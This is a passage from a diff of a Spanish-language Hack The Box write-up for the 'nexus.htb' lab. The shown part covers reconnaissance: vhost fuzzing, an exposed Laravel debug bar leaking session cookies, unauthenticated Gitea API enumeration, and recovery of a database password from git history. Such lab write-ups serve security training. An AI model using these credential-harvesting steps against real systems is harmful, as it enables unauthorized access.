-# Añadimos la línea: 10.129.175.212 nexus.htb
-</code></pre>
-<h3 id="enumeracion-web-puerto-80">Enumeración Web (Puerto 80)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>vim<span class="w"> </span>/etc/hosts
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1"># Añadimos la línea: 10.129.175.212 nexus.htb</span>
+</code></pre></div>
+<h3 id="enumeracion-web-puerto-80">Enumeración Web (Puerto 80)<a class="headerlink" href="#enumeracion-web-puerto-80" title="Permanent link">&para;</a></h3>
 <p><img alt="cap1" src="cap1.png" /></p>
 <p>Al acceder a <code>http://nexus.htb</code> nos encontramos con el portal de <strong>Nexus Energy Authority</strong>, una supuesta agencia gubernamental del sector energético. Es una web corporativa estática con secciones sobre sus programas, el <em>mix</em> energético nacional, noticias y un apartado de empleo.</p>
 <p>Dos zonas llaman la atención desde el punto de vista de la enumeración:</p>
@@ -1349,185 +1402,185 @@ Nmap done: 1 IP address (1 host up) scanned in 25.97 seconds
 <li>El apartado <strong>Careers → "Join our team"</strong>. Al pulsar el botón <em>View role</em> se despliega un modal con la oferta de empleo y, al final del mismo, una sección "Ready to apply" que filtra dos direcciones de correo:</li>
 </ul>
 <p><img alt="cap3" src="cap3.png" /></p>
-<pre><code class="language-text">Ready to apply?
-
-Send your CV and a short cover note with the subject line &quot;Operations Specialist – Customer Platforms&quot;.
-Apply at careers@nexus.htb
-
-Questions? Reach out to our hiring manager: j.matthew@nexus.htb
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Ready to apply?
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Send your CV and a short cover note with the subject line &quot;Operations Specialist – Customer Platforms&quot;.
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Apply at careers@nexus.htb
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>Questions? Reach out to our hiring manager: j.matthew@nexus.htb
+</code></pre></div>
 <p>El dato más interesante es el correo del <em>hiring manager</em>: <strong><code>j.matthew@nexus.htb</code></strong>. El formato <code>j.matthew</code> encaja con un nombre de usuario típico del sistema (inicial del nombre + apellido), así que lo guardamos como posible usuario de cara a futuros accesos.</p>
 <p>Para identificar el <em>stack</em> tecnológico nos apoyamos en Wappalyzer:</p>
 <p><img alt="cap4" src="cap4.png" /></p>
-<pre><code class="language-text">Web servers:       Nginx 1.24.0
-Reverse proxies:   Nginx 1.24.0
-Operating systems: Ubuntu
-Font scripts:      Google Font API
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Web servers:       Nginx 1.24.0
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Reverse proxies:   Nginx 1.24.0
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Operating systems: Ubuntu
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Font scripts:      Google Font API
+</code></pre></div>
 <p>No aporta nada que no supiéramos ya por nmap: nginx haciendo también de proxy inverso sobre Ubuntu. Ese detalle del <strong>reverse proxy</strong> es relevante: sugiere que por detrás puede haber más aplicaciones servidas bajo distintos <em>virtual hosts</em>.</p>
-<h3 id="enumeracion-de-directorios">Enumeración de Directorios</h3>
+<h3 id="enumeracion-de-directorios">Enumeración de Directorios<a class="headerlink" href="#enumeracion-de-directorios" title="Permanent link">&para;</a></h3>
 <p>Como la web principal no ofrece funcionalidad interactiva, lanzamos un <em>fuzzing</em> de directorios con <code>dirsearch</code> para descartar paneles ocultos:</p>
-<pre><code class="language-bash">dirsearch -u http://nexus.htb/
-</code></pre>
-<pre><code class="language-text">  _|. _ _  _  _  _ _|_    v0.5.0
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295
-
-Target: http://nexus.htb/
-
-[19:49:25] Scanning: 
-[19:49:44] 200 -   48KB - /index.html
-
-Task Completed
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://nexus.htb/
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>  _|. _ _  _  _  _ _|_    v0.5.0
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a> (_||| _) (/_(_|| (_| )
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>Target: http://nexus.htb/
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>[19:49:25] Scanning: 
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>[19:49:44] 200 -   48KB - /index.html
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>Task Completed
+</code></pre></div>
 <p>El resultado es limpio: solo el <code>index.html</code>. Esto refuerza la idea de que el vector de entrada no está en el sitio principal, sino en otra aplicación servida por el proxy.</p>
-<h3 id="enumeracion-de-subdominios-vhosts">Enumeración de Subdominios (VHOSTS)</h3>
+<h3 id="enumeracion-de-subdominios-vhosts">Enumeración de Subdominios (VHOSTS)<a class="headerlink" href="#enumeracion-de-subdominios-vhosts" title="Permanent link">&para;</a></h3>
 <p>Dado que nginx actúa como <em>reverse proxy</em>, realizamos un descubrimiento de <em>virtual hosts</em> con <code>gobuster</code>. En entornos corporativos es habitual que un mismo servidor aloje varias aplicaciones bajo distintos subdominios:</p>
-<pre><code class="language-bash">gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://nexus.htb/ --append-domain
-</code></pre>
-<pre><code class="language-text">===============================================================
-Gobuster v3.8.2
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                       http://nexus.htb/
-[+] Method:                    GET
-[+] Threads:                   10
-[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
-[+] Append Domain:             true
-===============================================================
-Starting gobuster in VHOST enumeration mode
-===============================================================
-git.nexus.htb     Status: 200 [Size: 14474]
-billing.nexus.htb Status: 302 [Size: 390] [--&gt; http://billing.nexus.htb/admin/login]
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>gobuster<span class="w"> </span>vhost<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt<span class="w"> </span>-u<span class="w"> </span>http://nexus.htb/<span class="w"> </span>--append-domain
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>===============================================================
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Gobuster v3.8.2
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>===============================================================
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>[+] Url:                       http://nexus.htb/
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>[+] Method:                    GET
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>[+] Threads:                   10
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>[+] Append Domain:             true
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>===============================================================
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>Starting gobuster in VHOST enumeration mode
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>===============================================================
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>git.nexus.htb     Status: 200 [Size: 14474]
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>billing.nexus.htb Status: 302 [Size: 390] [--&gt; http://billing.nexus.htb/admin/login]
+</code></pre></div>
 <p>Aquí sí aparece información jugosa. Descubrimos <strong>dos subdominios nuevos</strong>:</p>
 <ul>
 <li><strong><code>git.nexus.htb</code></strong> → responde con un <code>200 OK</code>. El nombre sugiere algún tipo de servicio de alojamiento de repositorios Git (Gitea, GitLab…).</li>
 <li><strong><code>billing.nexus.htb</code></strong> → responde con un <code>302</code> que redirige a <code>/admin/login</code>, lo que delata un panel de administración de alguna aplicación de facturación.</li>
 </ul>
 <p>Añadimos ambos subdominios a nuestro <code>/etc/hosts</code>:</p>
-<pre><code class="language-bash">sudo vim /etc/hosts
-# 10.129.175.212 nexus.htb git.nexus.htb billing.nexus.htb
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sudo<span class="w"> </span>vim<span class="w"> </span>/etc/hosts
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="c1"># 10.129.175.212 nexus.htb git.nexus.htb billing.nexus.htb</span>
+</code></pre></div>
 <p>Con dos nuevas superficies de ataque identificadas, el siguiente paso es enumerarlas en detalle para encontrar nuestro punto de entrada.</p>
-<h3 id="enumeracion-de-gitnexushtb-gitea">Enumeración de <code>git.nexus.htb</code> (Gitea)</h3>
+<h3 id="enumeracion-de-gitnexushtb-gitea">Enumeración de <code>git.nexus.htb</code> (Gitea)<a class="headerlink" href="#enumeracion-de-gitnexushtb-gitea" title="Permanent link">&para;</a></h3>
 <p><img alt="cap5" src="cap5.png" /></p>
 <p>Al acceder a <code>http://git.nexus.htb</code> nos recibe una instancia de <strong>Gitea</strong>, un servicio de alojamiento de repositorios Git autoalojado. Nos ofrece el formulario de inicio de sesión (que admite tanto nombre de usuario como correo), pero de momento <strong>no disponemos de credenciales</strong> válidas.</p>
 <p>Wappalyzer confirma la tecnología por detrás:</p>
-<pre><code class="language-text">Web servers:         Nginx 1.24.0
-Programming languages: Go
-Operating systems:   Ubuntu
-Miscellaneous:       Open Graph, PWA
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Web servers:         Nginx 1.24.0
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Programming languages: Go
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Operating systems:   Ubuntu
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>Miscellaneous:       Open Graph, PWA
+</code></pre></div>
 <p>El dato más importante lo encontramos en el pie de página del sitio, que nos revela la versión exacta:</p>
-<pre><code class="language-text">Powered by Gitea · Version: 1.26.0
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Powered by Gitea · Version: 1.26.0
+</code></pre></div>
 <p><img alt="cap6" src="cap6.png" /></p>
 <p>Anotamos la versión <strong>Gitea 1.26.0</strong> por si resultara vulnerable a algún CVE conocido, y la dejamos aparcada de momento para revisar antes el panel de facturación. Más adelante volveremos sobre ella para enumerar los repositorios públicos.</p>
-<h3 id="enumeracion-de-billingnexushtb-krayin-crm">Enumeración de <code>billing.nexus.htb</code> (Krayin CRM)</h3>
+<h3 id="enumeracion-de-billingnexushtb-krayin-crm">Enumeración de <code>billing.nexus.htb</code> (Krayin CRM)<a class="headerlink" href="#enumeracion-de-billingnexushtb-krayin-crm" title="Permanent link">&para;</a></h3>
 <p><img alt="cap7" src="cap7.png" /></p>
 <p>El subdominio <code>billing.nexus.htb</code> nos redirige a <code>/admin/login</code>, un panel de inicio de sesión. El pie de página delata el software que corre por detrás:</p>
-<pre><code class="language-text">Powered by Krayin, an open-source project by Webkul.
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Powered by Krayin, an open-source project by Webkul.
+</code></pre></div>
 <p>Se trata de <strong>Krayin CRM</strong>, un CRM open-source desarrollado por Webkul sobre el framework <strong>Laravel</strong>. Como de costumbre, no tenemos credenciales para autenticarnos directamente.</p>
 <p>Sin embargo, al revisar la parte inferior de la página detectamos algo que no debería estar ahí: una <strong>barra de depuración (PHPDebugBar)</strong> completamente funcional, que nos deja inspeccionar peticiones, mensajes, vistas, <em>queries</em> SQL, etc.</p>
 <p><img alt="cap8" src="cap8.png" /></p>
 <p>Esto es un hallazgo crítico. Analizando el código fuente de la página encontramos, embebida en el JavaScript del DebugBar, la configuración interna de la aplicación:</p>
-<pre><code class="language-json">&quot;laravel&quot;: {
-    &quot;version&quot;: &quot;12.x&quot;,
-    &quot;tooltip&quot;: {
-        &quot;Laravel Version&quot;: &quot;12.54.1&quot;,
-        &quot;PHP Version&quot;: &quot;8.3.6&quot;,
-        &quot;Environment&quot;: &quot;local&quot;,
-        &quot;Debug Mode&quot;: &quot;Enabled&quot;,
-        &quot;URL&quot;: &quot;billing.nexus.htb&quot;,
-        &quot;Timezone&quot;: &quot;Asia/Kolkata&quot;,
-        &quot;Locale&quot;: &quot;en&quot;
-    }
-}
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nt">&quot;laravel&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">    </span><span class="nt">&quot;version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;12.x&quot;</span><span class="p">,</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span><span class="nt">&quot;tooltip&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">        </span><span class="nt">&quot;Laravel Version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;12.54.1&quot;</span><span class="p">,</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">        </span><span class="nt">&quot;PHP Version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;8.3.6&quot;</span><span class="p">,</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">        </span><span class="nt">&quot;Environment&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;local&quot;</span><span class="p">,</span>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">        </span><span class="nt">&quot;Debug Mode&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Enabled&quot;</span><span class="p">,</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">        </span><span class="nt">&quot;URL&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;billing.nexus.htb&quot;</span><span class="p">,</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">        </span><span class="nt">&quot;Timezone&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Asia/Kolkata&quot;</span><span class="p">,</span>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">        </span><span class="nt">&quot;Locale&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;en&quot;</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="p">}</span>
+</code></pre></div>
 <p>Dos banderas rojas enormes:</p>
 <ul>
 <li><strong><code>"Environment": "local"</code></strong> → la aplicación se ejecuta en modo de desarrollo, no en producción.</li>
 <li><strong><code>"Debug Mode": "Enabled"</code></strong> → el modo <em>debug</em> de Laravel está activo de cara al exterior.</li>
 </ul>
 <p>Dejar el modo <em>debug</em> de Laravel activo en una aplicación accesible públicamente es una mala práctica de seguridad grave. Expone trazas de error detalladas y, en este caso, habilita el <strong>PHPDebugBar</strong>, que además mantiene un almacén de las peticiones que la aplicación va procesando. En la propia página ya vemos cómo filtra información sensible como los tokens de sesión y CSRF:</p>
-<pre><code class="language-text">request_cookies
-    &quot;XSRF-TOKEN&quot;        =&gt; &quot;5mru0GIH4NW4dG5ZOjDazxRJw0ujlA0UJv05zISS&quot;
-    &quot;krayin_crm_session&quot; =&gt; &quot;0XfbdIiIq2jdXxD33NawMlv0dQWx9q3tZXyt7kip&quot;
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>request_cookies
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>    &quot;XSRF-TOKEN&quot;        =&gt; &quot;5mru0GIH4NW4dG5ZOjDazxRJw0ujlA0UJv05zISS&quot;
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>    &quot;krayin_crm_session&quot; =&gt; &quot;0XfbdIiIq2jdXxD33NawMlv0dQWx9q3tZXyt7kip&quot;
+</code></pre></div>
 <p>En teoría, el DebugBar puede guardar el <strong>contenido completo de cada petición</strong> (incluidos los cuerpos <code>POST</code>) en un almacén accesible a través del <em>endpoint</em> <code>/_debugbar/open</code>. Si estuviera habilitado y algún usuario iniciara sesión en el CRM, su petición de <em>login</em> —con el email y la contraseña en texto plano— quedaría registrada y podríamos recuperarla. Lo comprobamos:</p>
-<pre><code class="language-bash">curl -s &quot;http://billing.nexus.htb/_debugbar/open&quot; | jq .
-</code></pre>
-<pre><code class="language-text">[
-  {
-    &quot;datetime&quot;: &quot;2026-10-21 00:03:10&quot;,
-    &quot;id&quot;: null,
-    &quot;ip&quot;: &quot;&lt;TU_IP&gt;&quot;,
-    &quot;method&quot;: &quot;ERROR&quot;,
-    &quot;uri&quot;: &quot;!! To enable public access to previous requests, set debugbar.storage.open to true in your config, or enable DEBUGBAR_OPEN_STORAGE if you did not publish the config. !!&quot;,
-    &quot;utime&quot;: 1792521190.764237
-  }
-]
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;http://billing.nexus.htb/_debugbar/open&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>.
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>[
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>  {
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>    &quot;datetime&quot;: &quot;2026-10-21 00:03:10&quot;,
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>    &quot;id&quot;: null,
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>    &quot;ip&quot;: &quot;&lt;TU_IP&gt;&quot;,
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>    &quot;method&quot;: &quot;ERROR&quot;,
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>    &quot;uri&quot;: &quot;!! To enable public access to previous requests, set debugbar.storage.open to true in your config, or enable DEBUGBAR_OPEN_STORAGE if you did not publish the config. !!&quot;,
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>    &quot;utime&quot;: 1792521190.764237
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>  }
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>]
+</code></pre></div>
 <p>El propio <em>endpoint</em> nos responde que el <strong>acceso público al almacén de peticiones anteriores está deshabilitado</strong> (<code>debugbar.storage.open = false</code>). Por tanto, aunque el modo <em>debug</em> esté activo, no podemos listar ni volcar peticiones antiguas, y esta vía de cosecha de credenciales queda cerrada.</p>
 <p>Con el panel de facturación bloqueado por credenciales, retomamos el servicio que habíamos dejado aparcado: <strong>Gitea</strong>.</p>
-<h3 id="enumeracion-de-repositorios-en-gitea">Enumeración de repositorios en Gitea</h3>
+<h3 id="enumeracion-de-repositorios-en-gitea">Enumeración de repositorios en Gitea<a class="headerlink" href="#enumeracion-de-repositorios-en-gitea" title="Permanent link">&para;</a></h3>
 <p>Gitea permite la navegación anónima de todo el contenido marcado como público. En lugar de ir a ciegas por la interfaz web, consultamos directamente su <strong>API REST</strong>, que no requiere autenticación para listar repositorios y usuarios públicos:</p>
-<pre><code class="language-bash">curl -s &quot;http://git.nexus.htb/api/v1/repos/search?limit=50&quot; | jq -r '.data[].full_name'
-</code></pre>
-<pre><code class="language-text">admin/krayin-docker-setup
-</code></pre>
-<pre><code class="language-bash">curl -s &quot;http://git.nexus.htb/api/v1/users/search?limit=50&quot; | jq -r '.data[].login'
-</code></pre>
-<pre><code class="language-text">admin
-jones
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;http://git.nexus.htb/api/v1/repos/search?limit=50&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.data[].full_name&#39;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>admin/krayin-docker-setup
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;http://git.nexus.htb/api/v1/users/search?limit=50&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.data[].login&#39;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>admin
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>jones
+</code></pre></div>
 <p>La API nos devuelve dos piezas de información muy valiosas:</p>
 <ul>
 <li>Un <strong>repositorio público</strong>, <code>admin/krayin-docker-setup</code>, que por su nombre contiene el entorno de despliegue (Docker) del CRM de facturación. Este tipo de repositorios suele incluir ficheros <code>docker-compose.yml</code> y <code>.env</code> con credenciales de base de datos, el <code>APP_KEY</code> de Laravel e incluso las credenciales por defecto del administrador.</li>
 <li>Dos <strong>usuarios</strong>: <code>admin</code> y <code>jones</code>. El segundo, <code>jones</code>, no lo habíamos visto antes; lo anotamos como posible usuario del sistema de cara a un acceso por SSH o a la reutilización de contraseñas.</li>
 </ul>
 <p>Clonamos el repositorio para inspeccionarlo en local:</p>
-<pre><code class="language-bash">git clone http://git.nexus.htb/admin/krayin-docker-setup.git
-</code></pre>
-<h3 id="fuga-de-credenciales-en-el-historial-de-git">Fuga de credenciales en el historial de Git</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>git<span class="w"> </span>clone<span class="w"> </span>http://git.nexus.htb/admin/krayin-docker-setup.git
+</code></pre></div>
+<h3 id="fuga-de-credenciales-en-el-historial-de-git">Fuga de credenciales en el historial de Git<a class="headerlink" href="#fuga-de-credenciales-en-el-historial-de-git" title="Permanent link">&para;</a></h3>
 <p>El repositorio contiene un <code>.env</code> y un <code>docker-compose.yml</code>, pero al revisarlos vemos que están "sanitizados": los campos sensibles (<code>APP_KEY</code>, <code>DB_PASSWORD</code>…) aparecen vacíos.</p>
-<pre><code class="language-bash">cat .env
-</code></pre>
-<pre><code class="language-text">APP_KEY=
-APP_DEBUG=true
-APP_URL=http://billing.nexus.htb
-...
-DB_CONNECTION=mysql
-DB_HOST=krayin-mysql
-DB_DATABASE=krayin
-DB_USERNAME=krayin
-DB_PASSWORD=
-...
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>cat<span class="w"> </span>.env
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>APP_KEY=
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>APP_DEBUG=true
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>APP_URL=http://billing.nexus.htb
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>...
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>DB_CONNECTION=mysql
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>DB_HOST=krayin-mysql
+<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>DB_DATABASE=krayin
+<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>DB_USERNAME=krayin
+<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>DB_PASSWORD=
+<a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>...
+</code></pre></div>
 <p>Sin embargo, al clonar el repositorio observamos que arrastra historial (<code>Total 8, delta 1</code>). Un patrón habitual es que un desarrollador suba por error un fichero con secretos y lo "limpie" en un commit posterior, olvidando que <strong>Git conserva todo el historial</strong>. Listamos los commits:</p>
-<pre><code class="language-bash">git log --oneline --all
-</code></pre>
-<pre><code class="language-text">9b817fa (HEAD -&gt; main, origin/main, origin/HEAD) Upload files to &quot;/&quot;
-1615c46 Upload files to &quot;/&quot;
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>git<span class="w"> </span>log<span class="w"> </span>--oneline<span class="w"> </span>--all
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>9b817fa (HEAD -&gt; main, origin/main, origin/HEAD) Upload files to &quot;/&quot;
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>1615c46 Upload files to &quot;/&quot;
+</code></pre></div>
 <p>Hay dos commits. Revisamos las diferencias de todo el historial filtrando por términos sensibles:</p>
-<pre><code class="language-bash">git log -p --all | grep -iE 'APP_KEY|PASSWORD|secret|@nexus|ROOT'
-</code></pre>
-<pre><code class="language-text">Author: admin &lt;admin@nexus.htb&gt;
- APP_KEY=
--DB_PASSWORD=N27xh!!2ucY04
-+DB_PASSWORD=
-Author: admin &lt;admin@nexus.htb&gt;
-+APP_KEY=
-+DB_PASSWORD=N27xh!!2ucY04
-...
-</code></pre>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>git<span class="w"> </span>log<span class="w"> </span>-p<span class="w"> </span>--all<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s1">&#39;APP_KEY|PASSWORD|secret|@nexus|ROOT&#39;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Author: admin &lt;admin@nexus.htb&gt;
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a> APP_KEY=
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>-DB_PASSWORD=N27xh!!2ucY04
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>+DB_PASSWORD=
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>Author: admin &lt;admin@nexus.htb&gt;
